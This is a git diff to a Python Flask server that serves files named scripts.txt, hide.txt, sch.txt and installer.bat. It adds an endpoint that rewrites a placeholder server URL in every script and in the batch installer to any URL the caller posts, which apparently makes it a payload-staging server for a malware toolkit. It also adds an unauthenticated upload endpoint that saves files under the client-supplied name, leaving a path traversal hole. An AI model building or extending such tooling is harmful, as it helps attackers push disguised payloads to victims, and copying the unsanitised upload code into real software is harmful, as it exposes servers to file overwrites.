@@ -14,6 +14,7 @@ SCRIPTS_FILE = os.path.join("resources", "scripts.txt")
 HIDE_FILE = os.path.join("resources", "hide.txt")
 PS_FILE = os.path.join("resources", "hide.txt")
 SCH_FILE = os.path.join("resources", "sch.txt")
+BAT_FILE = os.path.join("resources", "installer.bat")
 
 if not os.path.exists(SCRIPTS_DIR):
     os.makedirs(SCRIPTS_DIR)
@@ -21,6 +22,20 @@ if not os.path.exists(SCRIPTS_DIR):
 
 def sanitize_filename(filename):
     return re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
+def modify_script_files(url):
+    scripts = os.listdir(SCRIPTS_DIR)
+    for script in scripts:
+        with open(os.path.join(SCRIPTS_DIR, script), 'r') as file:
+            data = file.read()
+        data = data.replace("https://server.api", url)
+        with open(os.path.join(SCRIPTS_DIR, script), 'w') as file:
+            file.write(data)
+def modify_installer(url):
+    with open(BAT_FILE, 'r') as file:
+        data = file.read()
+    data = data.replace("https://server.api", url)
+    with open(BAT_FILE, 'w') as file:
+        file.write(data)
 
 @app.route('/scripts.txt', methods=['GET'])
 def get_scripts():
@@ -76,9 +91,26 @@ def get_sch():
 def replywith_file():
     file = os.listdir('dist')[0]
     return send_file(f"dist\{file}", mimetype='text/plain')
+@app.route('/savefile', methods=['POST'])
+def save_file():
+    if 'file' not in request.files:
+        return 400
+    file = request.files['file']
+    if file.filename == '':
+        return 400
+    filename = file.filename
+    file_path = os.path.join("dist", filename)
+    file.save(file_path)
+    return f"Saved to {filename}", 200
 @app.route('/bat', methods=['GET'])
 def replywith_bat():
-    return send_file('resources\installer.bat', mimetype='text/plain')
+    return send_file(BAT_FILE, mimetype='text/plain')
+@app.route('/modify', methods=['POST'])
+def modify_scripts():
+    data = request.data.decode()
+    modify_script_files(data)
+    modify_installer(data)
+    return "OK", 200
 
 
 if __name__ == '__main__':
